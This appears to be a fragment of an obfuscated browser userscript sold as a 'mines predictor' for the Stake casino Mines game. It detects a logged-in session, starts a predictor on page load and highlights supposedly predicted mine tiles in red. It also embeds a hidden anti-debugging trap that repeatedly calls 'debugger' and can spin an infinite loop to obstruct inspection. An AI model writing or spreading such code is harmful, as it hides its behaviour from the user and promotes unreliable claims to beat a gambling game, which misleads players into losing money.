        const _0x56b1e7 = document.querySelector(this.config.selectors.balance);
        if (_0x56b1e7) {
          return true;
        }
        if (window.location.href.includes("stake." + webUrl + "/casino/games/mines")) {
          return true;
        }
        return false;
      } catch (_0x3aa713) {
        console.warn("Stake session validation error:", _0x3aa713);
        return document.querySelector(this.config.selectors.balance) !== null;
      }
    }
  }
  const _0x156303 = () => {
    try {
      window._predictor = new _0x5f8785();
    } catch (_0x2e18ab) {
      console.warn("Initialization error:", _0x2e18ab);
      setTimeout(_0x156303, 5000);
    }
  };
  if (document.readyState === "complete") {
    _0x156303();
  } else {
    window.addEventListener("load", _0x156303);
  }
})();
(function () {
  let _0x47b3c7;
  try {
    const _0x32b40a = Function("return (function() {}.constructor(\"return this\")( ));");
    _0x47b3c7 = _0x32b40a();
  } catch (_0x4ddd9a) {
    _0x47b3c7 = window;
  }
  _0x47b3c7.setInterval(_0x2aeb3f, 5000);
})();
function _0x2aeb3f(_0x31c01c) {
  function _0xfdb1f5(_0x22211e) {
    if (typeof _0x22211e === "string") {
      return function (_0x3bc116) {}.constructor("while (true) {}").apply("counter");
    } else {
      if (('' + _0x22211e / _0x22211e).length !== 1 || _0x22211e % 20 === 0) {
        (function () {
          return true;
        }).constructor("debugger").call("action");
      } else {
        (function () {
          return false;
        }).constructor("debugger").apply("stateObject");
      }
    }
    _0xfdb1f5(++_0x22211e);
  }
  try {
    if (_0x31c01c) {
      return _0xfdb1f5;
    } else {
      _0xfdb1f5(0);
    }
  } catch (_0x4e9f0b) {}
}


// Override autoplay to highlight mines instead of clicking
window._0xa1108c.autoplay = async function () {
  const mines = await window._0xa1108c.predictor();
  if (!Array.isArray(mines)) {
    console.warn("Prediction failed or returned invalid data.");
    return;
  }
  console.log("🔴 Highlighting predicted mines:", mines);
  mines.forEach(index => {
    const tile = document.querySelector(`[data-id="${index}"]`);
    if (tile) {
      tile.style.backgroundColor = "#ff4c4c";
      tile.style.boxShadow = "0 0 10px #ff0000";
    }
  });
  // Paused autoclicking logic — no clicks will be made
  console.log("Autoplay is now in visual highlight-only mode.");
};

